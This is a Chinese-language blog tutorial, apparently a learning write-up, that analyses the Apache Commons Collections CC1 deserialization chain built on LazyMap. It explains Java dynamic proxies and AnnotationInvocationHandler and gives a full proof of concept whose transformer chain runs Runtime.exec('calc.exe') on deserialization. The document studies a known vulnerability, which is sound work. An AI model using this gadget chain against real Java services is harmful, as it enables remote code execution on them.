<p>然后三个参数，第一个参数不要用，要用实例的化，我们可以在我们的代理类中写一个 <strong>构造方法</strong>，然后获取到<strong>被代理类的实例</strong>，然后用<code>invoke</code>执行<strong>被代理类</strong> 的方法即可，</p> 
<p><code>main()</code>函数中，需要我们将<strong>被代理类对象实例</strong>当作参数传入<strong>代理类对象实例</strong>中<code>InvocationHandler handler = new InvocationFlag(myflag);</code>。就是后面这个对象，决定了我们走 <code>invoke()</code> 的时候走的是哪一个 <code>invoke()</code>。</p> 
<p>然后再使用<code>Proxy.newProxyInstance(,,第三个参数是我们的代理类对象实例，)</code>获取一个<strong>真正代理做事情的对象</strong>，</p> 
<p>然后我们就用这个<strong>真正代理做事情的对象</strong>，调用任何<strong>被代理类对象实例</strong>的任何方法，都会先走<strong>代理类对象实例</strong>中写的<code>invoke()</code>方法，</p> 
<p>如果我们想做什么坏手段，都可以在<strong>代理类对象实例</strong>中写的<code>invoke()</code>方法中<code>坏事做尽</code>！</p> 
<p>就是这里决定的。当然也可以这样：<br> <img src="https://images2.imgbox.com/63/8a/R49CX6Ur_o.png" alt="在这里插入图片描述"><img src="https://images2.imgbox.com/0c/7a/TFDXi13V_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="3_LazyMap__305"></a>3. LazyMap 分析</h2> 
<h4><a id="31_309"></a>3.1为什么要使用动态代理</h4> 
<p>之所以会用到<strong>动态代理</strong>，就是因为如果我们不用<code>TransformedMap</code>而用<code>LazyMap</code>的话，<code>AnnotationInvocationHandler</code>的<code>readObject</code>里面并没有用到<code>get()</code>，但是在<code>invoke()</code>方法中却用到了：</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token class-name">Method</span> var2<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token class-name">String</span> var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">equalsImpl</span><span class="token punctuation">(</span>var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var5<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AssertionError</span><span class="token punctuation">(</span><span class="token string">"Too many parameters for an annotation method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">byte</span> var7 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">switch</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1776922004</span><span class="token operator">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                var7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">147696667</span><span class="token operator">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                var7 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">1444986633</span><span class="token operator">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"annotationType"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                var7 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">switch</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toStringImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
            <span class="token class-name">Object</span> var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IncompleteAnnotationException</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span>var6<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">generateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">cloneArray</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">return</span> var6<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>我们就用它的原生的<code>invoke()</code>就能够实现我们想要做的坏事了（ <code>get() --&gt; transform()</code> ）</p> 
<h4><a id="32__369"></a>3.2 漏洞触发点</h4> 
<p>先得到<strong>方法的名字</strong>和<strong>参数的类型数组</strong>，再依次对方法名称的哈希值用**<code>switch</code><strong>判断，如果不是</strong><code>equals,toString,hashCode和annotationType</code>**的话，就会进入<code>default</code>：</p> 
<pre><code class="prism language-java">            <span class="token keyword">default</span><span class="token operator">:</span>
                <span class="token class-name">Object</span> var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>这个<code>memberVallues</code>属性，就是我们构造函数中传入的被装饰后的 <code>Map</code> ，调用了<code>get()</code>方法，然后我们<code>get()</code>一个不存在的属性，然后他就走<code>transform()</code>方法了。就<strong>触发</strong>了就，这个 <code>memberValues</code>我们也是可控的，可在其构造方法的时候传入</p> 
<p><img src="https://images2.imgbox.com/54/e7/pNIQJvyD_o.png" alt="在这里插入图片描述"></p> 
<p>关键是反序列化怎么才能触发这个<code>invoke()方法</code>？注意到 <code>AnnotationInvocationHandler类</code> <strong>继承实现</strong>了<code>InvocationHandler类</code>，看到这里我恍然大悟，怪不得和动态代理有关。实际上对<strong>动态代理</strong>熟一点的话，我看到这个类的名字也就该想到了。</p> 
<p>因此大致的思路也就有了，用<code>AnnotationInvocationHandler</code>对我们构造的<code>Map</code>进行<code>代理</code>，这样在<code>readObject</code>中，只要调用了<code>委托对象</code>的任何方法，都会进入<code>AnnotationInvocationHandler#invoke方法</code>中，从而触发了漏洞。</p> 
<h4><a id="33_poc_394"></a>3.3 构造poc</h4> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>test<span class="token punctuation">.</span>adamtest</span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> test01 <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token string">"getRuntime"</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token string">"calc.exe"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 这里只是包装了一下要被代理的类，</span>
        <span class="token class-name">Map</span> proxymap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>
            <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
            handler
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//这里我们决定了用哪一个类作为代理，我们这个对象是必须有 `invoke()` 方法的</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>proxymap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这个是写入，自然是先流进来的。所以它要有参数</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将流进行反序列化的，所以需要流流入，所以他需要一个参数</span>
        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出的，数据流入它，所以它是作为其他流的输入的。它最后是输出用的</span>
        <span class="token comment">// 这里是用 ByteArrayOutputStram()来盛放。</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ObjectOutputStram(new FileOutputStream)一定要有一个输出兑现，他要把生成的字节给一个东西放着，</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/b2/28/RgHRQjU3_o.png" alt="在这里插入图片描述"></p> 
<p>这里我直接尝试序列化 <code>proxyMap</code>。但是在反序列化的时候没有成功，跟了一下，是动态代理没展现出来，</p> 
<blockquote> 
 <p>一个细节上的问题就是产生了<code>代理</code>的<code>proxyMap</code>后，还需要再利用它来生成一个<code>AnnotationInvocationHandler</code>对象，</p> 
 <pre><code class="prism language-java">	 <span class="token class-name">Object</span> o <span class="token operator">=</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
 <p>因为要序列化和反序列化的是<code>AnnotationInvocationHandler</code>对象。</p> 
</blockquote> 
<p>实际上，经过构造后，只要调用了<code>AnnotationInvocationHandler</code>的<code>memberValues</code>(也就是我们的<code>proxyMap</code>)的任何方法，都会触发漏洞</p> 
<h2><a id="4poc_494"></a>4.从反序列化的角度来看poc</h2> 
<h3><a id="41debug_500"></a>4.1跟着debug</h3> 
<p>我们最后是序列化<code>AnnotationInvocationHandler</code> 这个类，</p> 
<p>入口时<code>AnnotationInvocationHandler的readObject</code>：（其实入口可长了，我跟了好久才跟到这个的，，）<br> <img src="https://images2.imgbox.com/3f/c2/Eg29gHJe_o.png" alt="在这里插入图片描述"></p> 
<p><code>AnnotationInvocationHandler</code>的<code>memberValues</code>是一个LazyMap的类型就是哦我们刚开始传入的代理map<br> <img src="https://images2.imgbox.com/4f/62/M0cqfiKD_o.png" alt="在这里插入图片描述"></p> 
<p>然后因为是代理<code>proxymap</code>，然后会走代理类的<code>invoke()</code>也就是<code>AnnotationInvocationHandler</code>的<code>invoke()</code>。<br> <img src="https://images2.imgbox.com/16/8d/hkMy75RE_o.png" alt="在这里插入图片描述"></p> 
<p>可见，对象和方法都没错的。走到了下面的 <code>default</code>。就调用了<code>LazyMap#get()</code> 了</p> 
<p><img src="https://images2.imgbox.com/30/18/rE2MKTxr_o.png" alt="在这里插入图片描述"></p> 
<p>后面的应该就简单了</p> 
<p><img src="https://images2.imgbox.com/14/8e/qkauCGnF_o.png" alt="在这里插入图片描述"></p> 
<p>跟着 Chaintransform 就走完了<br> <img src="https://images2.imgbox.com/b4/6e/KwOJsqsz_o.png" alt="在这里插入图片描述"></p> 
<p>这里的<code>readObject</code>又调用了<code>this.memberValues</code>的<code>entrySet方法</code>。如果这里的 <code>memberValues</code> 是个<strong>代理类</strong>，那</p> 
<p>么就会调用<code>memberValues</code>对应<code>handler的invoke方法</code>，cc1中将<code>handler</code>设置为<code>AnnotationInvocationHandler</code> （其实现了<code>InvocationHandler</code>，所以可以被设置为代理类的<code>handler</code>）。</p> 
<h3><a id="42__540"></a>4.2 利用链分析：</h3> 
<p>入口时<code>AnnotationInvocationHandler的readObject</code>：</p> 
<p>在 <code>readObject</code> 时，会触发<code>AnnotationInvocationHandler#readObject</code>方法<br> <img src="https://images2.imgbox.com/72/49/T2XfvXLk_o.png" alt="在这里插入图片描述"></p> 
<p>此时调用了<code>this.memberValues.entrySet</code>，而<code>this.memberValues</code>是之前构造好的<code>proxy_map</code>，由于这是一个<strong>被代理对象</strong>，所以调用其方法时，会去调用其的<strong>代理类</strong>，也就是<code>handler</code>，的<code>invoke</code> 方法。</p> 
<p><img src="https://images2.imgbox.com/58/1c/A89YD6fa_o.png" alt="在这里插入图片描述"></p> 
<p>然后<code>AnnotationInvocationHandler#invoke()</code>、此时的<code>this.memberValues</code>为之前设置好的<code>lazymap</code>，所以这里调用的是<code>lazymap#get</code>，从而触发后边的rce链。</p> 
<p><img src="https://images2.imgbox.com/52/9a/f0G3EsBe_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="43__564"></a>4.3 唯一比较绕的点是</h3> 
<p>我们想走<code>AnnotationInvocationHandler</code>的<code>invoke()</code>，然后走<code>LazyMap#get()</code>。</p> 
<p>那么我们就需要有一个被<code>AnnotationInvocationHandler</code>代理的对象，来执行一个方法，从而调用<code>AnnotationInvocationHandler</code>的<code>invvoke</code>。那么找哪一个<strong>被代理的对象</strong>呢？</p> 
<p>我们选的是 <code>LazyMap</code>类的<code>outermap</code>。然后让<code>Map</code>类的<code>proxymap</code>，代表<code>AnnotationInvocationHandler</code>来代理<code>Lazymap</code>的<code>outermap</code>。</p> 
<p>但是反序列化过程中又不好直接让<code>outermap</code>执行一个方法，所以我们还是让<code>AnnotationInvocationHandler</code>来帮忙，</p> 
<p>在<code>AnnotationInvocationHandler</code>的<code>readObject()</code>中能让<code>outermap</code>执行方法，从而调用<code>AnnotationInvocationHandler</code>的<code>invoke()</code>。</p> 
<p>看起来绕，我们实例化了两次<code>AnnotationInvocationHandler</code>。但其实，一次是作为<strong>代理对象</strong>使用的，一次是作为*<strong>反序列化入口</strong>使用的。</p> 
<p>过程类似如下：</p> 
<p><code>AnnotationInvocationHandler#readObject()</code>—&gt;被代理对象-----&gt;<code>AnnotationInvocationHandler#invoke()</code>。</p> 
<p>这两个<code>AnnotationInvocationHandler</code>不是同一个。</p> 
<h2><a id="5__590"></a>5. 版本问题</h2> 
<p>依旧只适用于 <code>8u71</code>之前。</p> 
<h2><a id="6_596"></a>6.参考：</h2> 
<p>https://paper.seebug.org/1242/#_6</p> 
<p>https://y4tacker.blog.csdn.net/article/details/117448761</p> 
<p>https://ego00.blog.csdn.net/article/details/119705730</p> 
<p>《java安全漫谈11》</p>
                </div>
		</div>
	</article>
